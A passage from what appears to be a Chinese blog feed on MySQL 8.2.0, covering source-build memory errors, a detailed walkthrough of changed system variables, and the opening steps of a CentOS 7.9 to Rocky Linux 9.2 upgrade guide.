<p>cmake 过程中遇到报错，提示安装 <code>ncurses-devel</code>。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">yum install ncurses-devel</span><br></pre></td></tr></table></figure></div>
<p>安装完成后，再次 cmake 通过。</p>
<h3 id="编译报错">编译报错</h3>
<p>编译过程中，遇到报错，似乎无解，只能扩充 VM 资源，再次进行编译。</p>
<ul>
<li>第一次报错</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[ 88%] Building CXX object sql/CMakeFiles/sql_gis.dir/gis/overlaps.cc.o</span><br><span class="line">g++: fatal error: 已杀死 signal terminated program cc1plus</span><br><span class="line">compilation terminated.</span><br><span class="line">make[2]: *** [sql/CMakeFiles/sql_gis.dir/build.make:300：sql/CMakeFiles/sql_gis.dir/gis/intersection_functor.cc.o] 错误 1</span><br><span class="line">make[2]: *** 正在等待未完成的任务....</span><br><span class="line">make[1]: *** [CMakeFiles/Makefile2:33773：sql/CMakeFiles/sql_gis.dir/all] 错误 2</span><br><span class="line">make: *** [Makefile:166：all] 错误 2</span><br><span class="line"></span><br><span class="line">real    150m33.063s</span><br><span class="line">user    192m24.614s</span><br><span class="line">sys     33m36.786s</span><br><span class="line">[root@rocky9 debug]#</span><br></pre></td></tr></table></figure></div>
<ul>
<li>第二次报错</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[ 61%] Linking CXX executable ../runtime_output_directory/mysqld</span><br><span class="line">collect2: fatal error: ld terminated with signal 9 [已杀死]</span><br><span class="line">compilation terminated.</span><br><span class="line">make[2]: *** [sql/CMakeFiles/mysqld.dir/build.make:157：runtime_output_directory/mysqld] 错误 1</span><br><span class="line">make[2]: *** 正在删除文件“runtime_output_directory/mysqld”</span><br><span class="line">make[1]: *** [CMakeFiles/Makefile2:12706：sql/CMakeFiles/mysqld.dir/all] 错误 2</span><br><span class="line">make: *** [Makefile:156：all] 错误 2</span><br><span class="line"></span><br><span class="line">real    98m7.350s</span><br><span class="line">user    79m50.233s</span><br><span class="line">sys     11m1.616s</span><br></pre></td></tr></table></figure></div>
<p>这里也提示，在编译 MySQL 源码时，机器资源要给多一些，2c2g 是编译不过的。</p>
<h2 id="总结">总结</h2>
<p>文本介绍了如何编译 MySQL 8.2.0 源码，及进行了新特性的尝试。</p>
<p>不过，也遇到了一个问题，就是编译时间很长，如上面的编译报错，是在经历 150 分钟后，才抛出报错。</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >]]></content>
      <categories>
        <category>MySQL</category>
        <category>MySQL 8.x</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>compile</tag>
        <tag>rocky</tag>
        <tag>mysql 8.2</tag>
      </tags>
  </entry>
  <entry>
    <title>【MySQL 8.x】从参数变化解读 MySQL 8.2.0 发版说明</title>
    <url>/2023/mysql/mysql-8.2.0-sys-vars/</url>
    <content><![CDATA[<p>日前，MySQL 8.2.0 创新版本已正式上线，并提供安装包下载，但 docker 镜像尚未更新。</p>
<p>在 MySQL 8.1.0 刚发版时也做过分析，欢迎阅读： <a href="https://shawnyan.cn/2023/mysql/mysql-8.1.0-release/">重磅！MySQL 8.1.0 已来！有彩蛋~</a></p>
<p>本文将通过 MySQL 启动选项和系统参数的变更情况，来深入了解 8.2.0 都有哪些变化。</p>
<h2 id="启动-MySQL-8-2-0">启动 MySQL 8.2.0</h2>
<p>这一小节不是本文的重点，我们快速推进。</p>
<p>从官网直接下载二进制包，并初始化运行。</p>
<ul>
<li>初始化日志：</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@centos7 ~]$ sudo /usr/local/mysql/bin/mysqld --initialize-insecure</span><br><span class="line">2023-10-26T01:57:36.185664Z 0 [System] [MY-015017] [Server] MySQL Server Initialization - start.</span><br><span class="line">2023-10-26T01:57:36.187344Z 0 [System] [MY-013169] [Server] /usr/local/mysql/bin/mysqld (mysqld 8.2.0) initializing of server in progress as process 119963</span><br><span class="line">2023-10-26T01:57:36.194573Z 1 [System] [MY-013576] [InnoDB] InnoDB initialization has started.</span><br><span class="line">2023-10-26T01:57:36.712452Z 1 [System] [MY-013577] [InnoDB] InnoDB initialization has ended.</span><br><span class="line">2023-10-26T01:57:38.681960Z 6 [Warning] [MY-010453] [Server] root@localhost is created with an empty password ! Please consider switching off the --initialize-insecure option.</span><br><span class="line">2023-10-26T01:57:42.299632Z 0 [System] [MY-015018] [Server] MySQL Server Initialization - end.</span><br></pre></td></tr></table></figure></div>
<ul>
<li>服务器启动日志：</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[mysql@centos7 ~]$ /usr/local/mysql/bin/mysqld</span><br><span class="line">2023-10-26T02:00:07.525736Z 0 [System] [MY-015015] [Server] MySQL Server - start.</span><br><span class="line">2023-10-26T02:00:08.462689Z 0 [System] [MY-010116] [Server] /usr/local/mysql/bin/mysqld (mysqld 8.2.0) starting as process 120743</span><br><span class="line">2023-10-26T02:00:08.473638Z 1 [System] [MY-013576] [InnoDB] InnoDB initialization has started.</span><br><span class="line">2023-10-26T02:00:09.377582Z 1 [System] [MY-013577] [InnoDB] InnoDB initialization has ended.</span><br><span class="line">2023-10-26T02:00:09.757717Z 0 [Warning] [MY-010068] [Server] CA certificate ca.pem is self signed.</span><br><span class="line">2023-10-26T02:00:09.757776Z 0 [System] [MY-013602] [Server] Channel mysql_main configured to support TLS. Encrypted connections are now supported for this channel.</span><br><span class="line">2023-10-26T02:00:09.822331Z 0 [System] [MY-011323] [Server] X Plugin ready for connections. Bind-address: &#x27;::&#x27; port: 33060, socket: /tmp/mysqlx.sock</span><br><span class="line">2023-10-26T02:00:09.822417Z 0 [System] [MY-010931] [Server] /usr/local/mysql/bin/mysqld: ready for connections. Version: &#x27;8.2.0&#x27;  socket: &#x27;/tmp/mysql.sock&#x27;  port: 3306  MySQL Community Server - GPL.</span><br><span class="line"></span><br><span class="line">2023-10-26T02:00:22.899823Z 8 [Warning] [MY-013360] [Server] Plugin mysql_native_password reported: &#x27;&#x27;mysql_native_password&#x27; is deprecated and will be removed in a future release. Please use caching_sha2_password instead&#x27;</span><br></pre></td></tr></table></figure></div>
<p>为了便于测试，这里直接将 root 用户密码设为空，并直接运行 mysqld 服务。</p>
<ul>
<li>登陆 MySQL 并查看版本信息：</li>
</ul>
<img  alt="01.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/datalk/talk_1698285812343.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="删除的参数-3">删除的参数 (3)</h2>
<h3 id="1-abort-slave-event-count">1. abort-slave-event-count</h3>
<blockquote>
<p>The deprecated server startup options --abort-slave-event-count and --disconnect-slave-event-count, deprecated in MySQL 8.0, have been removed in this release. Attempting to start mysqld with either of these options now results in an error.</p>
</blockquote>
<p><code>abort_slave_event_count</code> / <code>disconnect_slave_event_count</code> 这两个启动参数在之前的版本中用做测试，并非真的生产环境参数。</p>
<p>从 8.0.29 版本开始，被标记为废弃状态，从 8.2.0 开始，正式被移除。</p>
<h3 id="2-disconnect-slave-event-count">2. disconnect-slave-event-count</h3>
<p>同上。</p>
<h3 id="3-expire-logs-days">3. expire-logs-days</h3>
<p><code>expire_logs_days</code> 参数用于设定二进制日志保留天数，从 8.2.0 开始，正式被移除。</p>
<p>从 MySQL 8.0.1 开始，新增参数 <code>binlog_expire_logs_seconds</code>，以秒为单位控制二进制日志的保留时长。</p>
<p>默认值为 2592000 ，即 30 天。最大值为 4294967295 ，即 unsigned int 最大值，约 138 年。</p>
<p>在 MariaDB 中，从 10.6.1 开始引入 <code>binlog_expire_logs_seconds</code> 参数，但默认值为 0 ，需要自己进行设定。</p>
<h2 id="变更值的参数-6">变更值的参数 (6)</h2>
<h3 id="1-master-retry-count">1. master-retry-count</h3>
<p><code>master_retry_count</code> 参数用于设定复制连接超时后，重试连接的最大次数。 在 8.2.0 默认值为 10 ，而 8.0.35 的默认值为 86400 ，这一变更是从 8.1.0 开始的。</p>
<p>需要注意的是，创建复制的语法 <code>change master to</code> 已经废弃，改为 <code>change replication source to</code>。</p>
<h3 id="2-optimizer-switch-hash-set-operations-on">2. optimizer-switch (hash_set_operations=on)</h3>
<p>从 8.2.0 开始， <code>optimizer_switch</code> 中新增了一个控制标记 <code>hash_set_operations</code>，默认值为 <code>on</code>。</p>
<p>用于对集合操作(包括 EXCEPT 和 INTERSECT)进行哈希表优化，这种优化用于哈希的内存量可以使用 <code>set_operations_buffer_size</code> 系统变量来控制。</p>
<p>系统变量 <code>set_operations_buffer_size</code> 是 MySQL 8.2.0 新引入的，下面会再介绍。</p>
<h3 id="3-performance-schema-error-size">3. performance-schema-error-size</h3>
<p><code>performance_schema_error_size</code> 表示数据库错误码的数量，在 MySQL 8.0.35 中，默认值为 5307 ，而在 MySQL 8.2.0 中，变更为 5377 。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> version(),<span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> performance_schema.events_errors_summary_global_by_error;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+----------+</span></span><br><span class="line"><span class="operator">|</span> version() <span class="operator">|</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">8.2</span><span class="number">.0</span>     <span class="operator">|</span>     <span class="number">5377</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+----------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></div>
<p>源码中的定义如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> Sys_var_long <span class="title function_">Sys_pfs_error_size</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="string">&quot;performance_schema_error_size&quot;</span>, <span class="string">&quot;Number of server errors instrumented.&quot;</span>,</span></span><br><span class="line"><span class="params">    READ_ONLY GLOBAL_VAR(pfs_param.m_error_sizing), CMD_LINE(REQUIRED_ARG),</span></span><br><span class="line"><span class="params">    VALID_RANGE(<span class="number">0</span>, <span class="number">1024</span> * <span class="number">1024</span>), DEFAULT(PFS_MAX_GLOBAL_SERVER_ERRORS),</span></span><br><span class="line"><span class="params">    BLOCK_SIZE(<span class="number">1</span>), PFS_TRAILING_PROPERTIES)</span>;</span><br></pre></td></tr></table></figure></div>
<h3 id="4-performance-schema-max-memory-classes">4. performance-schema-max-memory-classes</h3>
<p><code>performance_schema_max_memory_classes</code> 是全局只读参数，表示 memory instruments 的最大数量。</p>
<p>在 MySQL 8.0.35 中，默认值为 450 ，但在 MySQL 8.2.0 中变为 470 ，不过官方文档尚未更新。</p>
<p>已在 MySQL Bugs 网站提交相关 bug：</p>
<p><a class="link"   href="https://bugs.mysql.com/bug.php?id=112839" >https://bugs.mysql.com/bug.php?id=112839 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="5-performance-schema-max-rwlock-classes">5. performance-schema-max-rwlock-classes</h3>
<p><code>performance_schema_max_rwlock_classes</code> 是全局只读参数，表示 rwlock instruments 的最大数量。</p>
<p>在 MySQL 8.0.35 中，默认值为 60 ，但在 MySQL 8.2.0 中变为 100 。</p>
<h3 id="6-performance-schema-max-statement-classes">6. performance-schema-max-statement-classes</h3>
<p><code>performance_schema_max_statement_classes</code> 是全局只读参数，表示 statement instruments 的最大数量。</p>
<p>默认值是在服务器构建时根据客户机/服务器协议中的命令数量和服务器支持的SQL语句类型数量计算的。</p>
<p>在 MySQL 8.0.35 中，默认值为 219 ，而在 MySQL 8.2.0 中变为 220 。</p>
<p>那么，多的1个是从哪来的呢？</p>
<p>从相关代码提交记录可以看到描述：</p>
<p><a class="link"   href="https://github.com/mysql/mysql-server/commit/eb7dd6c6c10c0437658caa7b9c7716c0468582fa" >https://github.com/mysql/mysql-server/commit/eb7dd6c6c10c0437658caa7b9c7716c0468582fa <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
WL#15426: Implement SHOW PARSE_TREE</p>
<blockquote>
<p>Implemented a SHOW PARSE_TREE statement in debug builds to display the JSON-formatted parse tree for a SELECT statement. This statement is not supported in release builds, and is available only in debug builds, or by compiling the server using -DWITH_SHOW_PARSE_TREE. (WL #15426)</p>
</blockquote>
<p>从 MySQL 8.1.0 开始，引入新 SQL 语句， <code>show parse_tree</code> 用来调试 <code>select</code> 语句，并以 json 格式展示。<br>
需要注意的是，该参数只能用于 Debug 模式，所以官方下载的正式安装包是无法使用该语法的，否则会报语法错误。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SHOW</span> PARSE_TREE <span class="keyword">select</span> <span class="number">1</span>;</span><br><span class="line">ERROR <span class="number">1064</span> (<span class="number">42000</span>): You have an error <span class="keyword">in</span> your <span class="keyword">SQL</span> syntax; <span class="keyword">check</span> the manual that corresponds <span class="keyword">to</span> your MySQL server version <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> use near <span class="string">&#x27;PARSE_TREE select 1&#x27;</span> <span class="keyword">at</span> line <span class="number">1</span></span><br></pre></td></tr></table></figure></div>
<h2 id="新增的参数-7">新增的参数 (7)</h2>
<h3 id="1-mysql-native-password">1. mysql-native-password</h3>
<p>MySQL 中创建用户时默认的密码插件已经变更为 <code>caching_sha2_password</code>，但目前仍然支持使用 <code>mysql_native_password</code>，该参数就是控制服务器启动时，是否启用该密码插件。</p>
<p>在 8.1.0 的发版说明中有如下一段描述：</p>
<p><a class="link"   href="https://dev.mysql.com/doc/relnotes/mysql/8.1/en/news-8-1-0.html" >https://dev.mysql.com/doc/relnotes/mysql/8.1/en/news-8-1-0.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<blockquote>
<p>The mysql_native_password authentication plugin now is deprecated and subject to removal in a future version of MySQL. CREATE USER, ALTER USER, and SET PASSWORD operations now insert a deprecation warning into the server error log if an account attempts to authenticate using mysql_native_password as an authentication method. (Bug #35336317)</p>
</blockquote>
<p>具体演示如下：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">create</span> <span class="keyword">user</span> shawnyan identified <span class="keyword">with</span> mysql_native_password <span class="keyword">by</span> <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></div>
<p>日志中会提示该插件已弃用，请用 <code>caching_sha2_password</code> 代替。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">2023-10-26T09:04:32.364529Z 12 [Warning] [MY-013360] [Server] Plugin mysql_native_password reported: &#x27;&#x27;mysql_native_password&#x27; is deprecated and will be removed in a future release. Please use caching_sha2_password instead&#x27;</span><br></pre></td></tr></table></figure></div>
<h3 id="2-ndb-mgm-tls">2. ndb-mgm-tls</h3>
<p>启动选项 <code>ndb-mgm-tls</code>/<code>ndb-tls-search-path</code> 是 MySQL 8.2.0 新引入的，为 NDB 引擎增加 TLS 相关选项。</p>
<p>但由于文档中暂无相关参数描述，而且官网公开的 worklog 不再更新，所以无法查阅到具体的功能描述，仅能通过社区版的代码提交记录窥视一二。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">WL#15524 post-push fixes (2nd set)</span><br><span class="line">WL#15524 post-push fixes</span><br><span class="line">WL#15524 Patch #17 Run more existing MTR tests with TLS</span><br><span class="line">WL#15524 Patch #16 Use TLS for Event Listener</span><br><span class="line">WL#15524 Patch #15 Visbility</span><br><span class="line">WL#15524 Patch #14 Add MGM TLS support to all remaining tools</span><br><span class="line">WL#15524 patch #13 ndb_waiter and new MTR tests</span><br><span class="line">WL#15524 Patch #12 MGM TLS in API Nodes, mysqld, and Cluster/J</span><br><span class="line">WL#15524 Patch #11 Use MGM TLS in TransporterRegistry and MgmtSrvr</span><br><span class="line">WL#15524 Patches #9 and #10: --ndb-mgm-tls in ndbd and ndb_mgmd</span><br><span class="line">WL#15524 Patch #8 TLS options in ndb_mgm</span><br><span class="line">WL#15524 Patch #7 Add --ndb-mgm-tls option to ndb_sign_keys</span><br><span class="line">WL#15524 Patch #6 Command authorization in MGM client</span><br><span class="line">WL#15524 Patch #5 Command authorization in MGM server</span><br><span class="line">WL#15524 Patch #4 MGM TLS Configuration</span><br><span class="line">WL#15524 Patch #3 Use TLS for upgraded transporter</span><br><span class="line">WL#15524 Patch #2 TLS-safe upgrade of mgm socket to transporter</span><br><span class="line">WL#15524 Patch #1 &quot;START TLS&quot; for management API</span><br></pre></td></tr></table></figure></div>
<p>以及，从源码中，可以看到这个选项提供了三个选项值，分别是 <code>relaxed</code>,<code>strict</code>,<code>deferred</code>，默认值为 <code>relaxed</code>。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* ndb_mgm uses an extended form of the --ndb-mgm-tls enum, which accepts</span></span><br><span class="line"><span class="comment">   an extra option, &quot;disabled&quot;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span> * tls_names[] = &#123; <span class="string">&quot;relaxed&quot;</span>, <span class="string">&quot;strict&quot;</span>, <span class="string">&quot;deferred&quot;</span>, nullptr &#125;;</span><br></pre></td></tr></table></figure></div>
<h3 id="3-ndb-tls-search-path">3. ndb-tls-search-path</h3>
<p>用于存放 NDB 集群 TLS 私钥的目录。<br>
具体内容，同上。</p>
<h3 id="4-performance-schema-max-meter-classes">4. performance-schema-max-meter-classes</h3>
<p><code>performance_schema_max_meter_classes</code> 是全局只读系统变量，从 MySQL 8.2.0 开始引入，表示 meter instruments 可被创建的最大数量。</p>
<!--
https://dev.mysql.com/doc/refman/8.2/en/performance-schema-system-variables.html#sysvar_performance_schema_max_meter_classes
-->
<h3 id="5-performance-schema-max-metric-classes">5. performance-schema-max-metric-classes</h3>
<p><code>performance_schema_max_metric_classes</code> 是全局只读系统变量，从 MySQL 8.2.0 开始引入，表示 metric instruments 可被创建的最大数量。</p>
<p><code>performance_schema_max_meter_classes</code> / <code>performance_schema_max_metric_classes</code> 这两个变量是一个 worklog 里增加的，用于服务器的遥测指标接口。</p>
<p>另外，命令很相似，一个是 meter，另一个是 metric，需要注意区分。</p>
<!--
https://dev.mysql.com/doc/refman/8.2/en/performance-schema-system-variables.html#sysvar_performance_schema_max_metric_classes

https://github.com/mysql/mysql-server/commit/83926c7fda58664b649f0731a973ad610985d36e

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">WL#15199: PERFORMANCE_SCHEMA, OTEL METRICS INTERFACE</span><br><span class="line">Description:</span><br><span class="line">-----------</span><br><span class="line">This WL implements core part of the server telemetry metrics feature</span><br><span class="line">with the following deliverables:</span><br><span class="line">* Definition of service to instrument metrics (pfs_metrics_v1)</span><br><span class="line">* Implementation of pfs_metrics_v1 in the performance schema</span><br><span class="line">* Added setup_meter and setup_metrics performance schema tables</span><br><span class="line">* Code base instrumentation using pfs_metrics_v1 to expose metrics:</span><br><span class="line">  - from status variables in core server</span><br><span class="line">  - from status variables in innodb storage engine</span><br><span class="line">  - from status variables in X plugin</span><br><span class="line">  - custom metrics from health monitor component</span><br><span class="line">* Service definition for metric exporter (mysql_server_telemetry_metrics_v1)</span><br><span class="line">* Implementation of this interface in a server component</span><br><span class="line">* A test component (test_server_telemetry_metrics) using the service</span><br><span class="line">  to test the feature</span><br></pre></td></tr></table></figure></div>
<p>–&gt;</p>
<h3 id="6-set-operations-buffer-size">6. set-operations-buffer-size</h3>
<p><code>set_operations_buffer_size</code> 可以动态调整，默认值为 256K，最大可以调整到 1GB，从 MySQL 8.2.0 开始引入。</p>
<p>在上面的 <code>optimizer-switch (hash_set_operations=on)</code> 部分已经介绍过。</p>
<p>相关文档参见：</p>
<p><a class="link"   href="https://dev.mysql.com/doc/refman/8.2/en/server-system-variables.html#sysvar_set_operations_buffer_size" >https://dev.mysql.com/doc/refman/8.2/en/server-system-variables.html#sysvar_set_operations_buffer_size <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="7-tls-certificates-enforced-validation">7. tls-certificates-enforced-validation</h3>
<p><code>tls_certificates_enforced_validation</code> 表示在数据库启动时，强制校验 SSL 证书是否有效，如果设定为 <code>TRUE</code> ，那么数据库在发现无效证书时将停止启动，其默认值为 <code>OFF</code>。</p>
<!--
https://dev.mysql.com/doc/refman/8.2/en/server-system-variables.html#sysvar_tls_certificates_enforced_validation
-->
<h2 id="总结">总结</h2>
<p>MySQL 8.2.0 启动选项和系统变量的变化多达 16 项，还有很多系统状态变量文本没有列举。</p>
<img  alt="mysql-params-diff.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231027-3bcb0b6f-c75a-4a3f-852f-5b6852bf9f78.png"
                      referrerpolicy="no-referrer"
                >
<p>MySQL 8.2.0 是 MySQL 变更发版模型后的第二个版本，是创新版本 (Innovation Release)，不建议部署到生产环境。</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >]]></content>
      <categories>
        <category>MySQL</category>
        <category>MySQL 8.x</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>mysql news</tag>
        <tag>mysql 新特性</tag>
        <tag>mysql 8.2</tag>
      </tags>
  </entry>
  <entry>
    <title>【Rocky 9】Step by Step 从 CentOS 7.9 升级到 Rocky Linux 9.2</title>
    <url>/2023/linux/centos-7.9-upgrade-to-rocky-9.2/</url>
    <content><![CDATA[<img  alt="rocky-linux.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231024-387674d4-6bf9-4517-bb04-e0c9212ceae4.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="概述">概述</h2>
<p>前文(《 <a class="link"   href="https://www.modb.pro/db/1708651177100013568" >【PG16】 后 RHEL 7 时代, PG 16 如何在 CentOS 7 上运行 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 》) 说到，PG16 已经对 CentOS 7 停止支持，不再提供相应的 RPM 包，或许也是时候考虑将 CentOS 7 系统进行升级了。</p>
<p>本文将演示如何将 CentOS 7.9 升级到 Rocky Linux 9.2。</p>
<p>由于某些不可控因素，无法从 CentOS 7.9 直接升级到 Rocky Linux 9.2，而是选择这样一个路径：</p>
<p><code>CentOS 7.9 --&gt; CentOS 8.5 --&gt; Rocky Linux 8.8 --&gt; Rocky Linux 9.2</code></p>
<h2 id="检查">检查</h2>
<p>检查系统 Kernel 及 OS 版本。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">uname -r</span><br><span class="line">cat /etc/redhat-release</span><br></pre></td></tr></table></figure></div>
<p>输出日志：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@shawnyan ~]# uname -r</span><br><span class="line">3.10.0-1160.95.1.el7.x86_64</span><br><span class="line">[root@shawnyan ~]# cat /etc/redhat-release</span><br><span class="line">CentOS Linux release 7.9.2009 (Core)</span><br></pre></td></tr></table></figure></div>
<h2 id="安装-dnf">安装 dnf</h2>
<p>从 RHEL 8 开始，系统默认安装并使用 dnf 作为包管理器，这里先安装 dnf，以替代 yum。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">yum install dnf -y</span><br><span class="line">dnf --version</span><br></pre></td></tr></table></figure></div>
<p>输出日志：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@shawnyan ~]# yum install dnf -y</span><br><span class="line">Loaded plugins: fastestmirror, langpacks</span><br><span class="line">...</span><br><span class="line">Dependencies Resolved</span><br><span class="line"></span><br><span class="line">============================================================================================================================================================================================================================================</span><br><span class="line">Package                                                     Arch                                              Version                                                      Repository                                                 Size</span><br><span class="line">============================================================================================================================================================================================================================================</span><br><span class="line">Installing:</span><br><span class="line">dnf                                                         noarch                                            4.0.9.2-2.el7_9                                              extras-aliyun                                             357 k</span><br><span class="line">Installing for dependencies:</span><br><span class="line">dnf-data                                                    noarch                                            4.0.9.2-2.el7_9                                              extras-aliyun                                              51 k</span><br><span class="line">libcomps                                                    x86_64                                            0.1.8-14.el7                                                 extras-aliyun                                              75 k</span><br><span class="line">libdnf                                                      x86_64                                            0.22.5-2.el7_9                                               extras-aliyun                                             535 k</span><br><span class="line">libmodulemd                                                 x86_64                                            1.6.3-1.el7                                                  extras-aliyun                                             141 k</span><br><span class="line">librepo                                                     x86_64                                            1.8.1-8.el7_9                                                updates-aliyun                                             82 k</span><br><span class="line">libsolv                                                     x86_64                                            0.6.34-4.el7                                                 base-aliyun                                               329 k</span><br><span class="line">python2-dnf                                                 noarch                                            4.0.9.2-2.el7_9                                              extras-aliyun                                             414 k</span><br><span class="line">python2-hawkey                                              x86_64                                            0.22.5-2.el7_9                                               extras-aliyun                                              71 k</span><br><span class="line">python2-libcomps                                            x86_64                                            0.1.8-14.el7                                                 extras-aliyun                                              47 k</span><br><span class="line">python2-libdnf                                              x86_64                                            0.22.5-2.el7_9                                               extras-aliyun                                             611 k</span><br><span class="line"></span><br><span class="line">Transaction Summary</span><br><span class="line">============================================================================================================================================================================================================================================</span><br><span class="line">Install  1 Package (+10 Dependent packages)</span><br><span class="line"></span><br><span class="line">Total download size: 2.6 M</span><br><span class="line">Installed size: 10 M</span><br><span class="line">Downloading packages:</span><br><span class="line">(1/11): dnf-data-4.0.9.2-2.el7_9.noarch.rpm                                                                                                                                                                          |  51 kB  00:00:00     </span><br><span class="line">(2/11): dnf-4.0.9.2-2.el7_9.noarch.rpm                                                                                                                                                                               | 357 kB  00:00:00     </span><br><span class="line">(3/11): libcomps-0.1.8-14.el7.x86_64.rpm                                                                                                                                                                             |  75 kB  00:00:00     </span><br><span class="line">(4/11): libmodulemd-1.6.3-1.el7.x86_64.rpm                                                                                                                                                                           | 141 kB  00:00:00     </span><br><span class="line">(5/11): libdnf-0.22.5-2.el7_9.x86_64.rpm                                                                                                                                                                             | 535 kB  00:00:00     </span><br><span class="line">(6/11): librepo-1.8.1-8.el7_9.x86_64.rpm                                                                                                                                                                             |  82 kB  00:00:00     </span><br><span class="line">(7/11): python2-hawkey-0.22.5-2.el7_9.x86_64.rpm                                                                                                                                                                     |  71 kB  00:00:00     </span><br><span class="line">(8/11): python2-dnf-4.0.9.2-2.el7_9.noarch.rpm                                                                                                                                                                       | 414 kB  00:00:00     </span><br><span class="line">(9/11): python2-libcomps-0.1.8-14.el7.x86_64.rpm                                                                                                                                                                     |  47 kB  00:00:00     </span><br><span class="line">(10/11): libsolv-0.6.34-4.el7.x86_64.rpm                                                                                                                                                                             | 329 kB  00:00:00     </span><br><span class="line">(11/11): python2-libdnf-0.22.5-2.el7_9.x86_64.rpm                                                                                                                                                                    | 611 kB  00:00:00     </span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">Total                                                                                                                                                                                                       1.2 MB/s | 2.6 MB  00:00:02     </span><br><span class="line">...</span><br><span class="line">[root@shawnyan ~]# dnf --version</span><br><span class="line">4.0.9</span><br><span class="line">  Installed: dnf-0:4.0.9.2-2.el7_9.noarch at Thu 05 Oct 2023 02:54:34 PM CST</span><br><span class="line">  Built    : CentOS BuildSystem &lt;http://bugs.centos.org&gt; at Wed 07 Apr 2021 03:52:38 PM CST</span><br><span class="line"></span><br><span class="line">  Installed: rpm-0:4.11.3-48.el7_9.x86_64 at Fri 10 Feb 2023 02:11:48 PM CST</span><br><span class="line">  Built    : CentOS BuildSystem &lt;http://bugs.centos.org&gt; at Wed 24 Nov 2021 04:33:39 PM CST</span><br><span class="line">[root@shawnyan ~]#</span><br></pre></td></tr></table></figure></div>
<h2 id="检查包冲突，并卸载冲突的包">检查包冲突，并卸载冲突的包</h2>
<p>在升级之前，需要先解决包冲突的问题，不然升级过程中会遇到报错。这一步也是在后续整理文章时加入的。</p>
<p>具体命令如下：</p>
